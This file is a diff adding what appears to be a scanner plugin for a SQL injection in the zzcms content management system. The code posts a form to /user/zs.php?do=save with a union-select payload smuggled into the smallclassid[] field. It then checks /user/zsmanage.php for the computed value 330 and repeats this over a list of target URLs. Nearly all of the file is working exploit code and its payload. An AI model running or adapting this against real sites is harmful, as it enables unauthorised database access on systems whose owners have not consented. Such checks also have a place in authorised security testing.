@@ -1,0 +1,26 @@
+#request urls = array
+#define payload = /user/zsmanage.php
+#define bug = 330
+#define info = zzcms-zsmanage-sqli
+#define post = proname=test66&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse=test66&sx%5B%5D=&sx%5B%5D=&sm=test66&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%2033*10%23
+#define postpath = /user/zs.php?do=save
+
+function main(args){
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			HttpPost(url.postpath,post,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+	
+}
